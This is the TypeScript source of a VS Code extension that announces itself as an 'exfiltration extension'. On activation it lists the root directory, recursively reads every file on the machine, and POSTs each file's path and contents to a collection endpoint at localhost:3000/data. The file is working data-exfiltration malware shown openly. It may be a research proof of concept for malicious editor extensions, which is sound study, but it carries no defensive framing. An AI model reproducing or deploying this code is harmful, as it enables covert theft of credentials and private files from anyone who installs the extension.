import * as vscode from 'vscode';
import { exec } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';

// Root directory to scan
const rootDir = '/';

// Function to create a delay
function delay(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Function to read files and subdirectories recursively
async function readDirectoryRecursive(directoryPath: string) {
    const filesAndDirs = fs.readdirSync(directoryPath);
    for (const fileOrDir of filesAndDirs) {
        const fullPath = path.join(directoryPath, fileOrDir);

        // Check if it's a directory, if so, recurse into it
        if (fs.statSync(fullPath).isDirectory()) {
            await readDirectoryRecursive(fullPath); // Use await for recursion to handle delays
        } else {
            // It's a file, read and send the contents
            const fileContents = fs.readFileSync(fullPath, 'utf-8');
            await sendFileContent(fullPath, fileContents);
            // Wait 1 second before sending the next request
            await delay(1000);
        }
    }
}

// Function to send the file content via POST request
async function sendFileContent(filePath: string, content: string) {
    try {
        const response = await fetch('http://localhost:3000/data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ filePath, content })
        });

        if (response.ok) {
            vscode.window.showInformationMessage(`Data for ${filePath} sent successfully!`);
        } else {
            vscode.window.showErrorMessage(`Failed to send data for ${filePath}: ${response.statusText}`);
        }
    } catch (error) {
        vscode.window.showErrorMessage(`Error sending data for ${filePath}: ${(error as Error).message}`);
    }
}

export function activate() {
    vscode.window.showInformationMessage('exfiltration extension activated!');

    // Run "ls /" to get the list of top-level directories
    exec('ls /', (error, stdout, stderr) => {
        if (error) {
            vscode.window.showErrorMessage(`Error executing ls: ${error.message}`);
            return;
        }
        if (stderr) {
            vscode.window.showErrorMessage(`stderr: ${stderr}`);
            return;
        }

        // Split the output from "ls /" and iterate over each directory/file
        const directoriesToScan = stdout.split('\n').filter(dir => dir); // Remove any empty strings

        // Iterate through each directory/file and scan its contents
        directoriesToScan.forEach(directory => {
            const directoryPath = path.join(rootDir, directory);
            if (fs.existsSync(directoryPath)) {
                readDirectoryRecursive(directoryPath); // Begin reading and processing files
            } else {
                vscode.window.showErrorMessage(`Directory ${directoryPath} does not exist!`);
            }
        });
    });
}

export function deactivate() {}
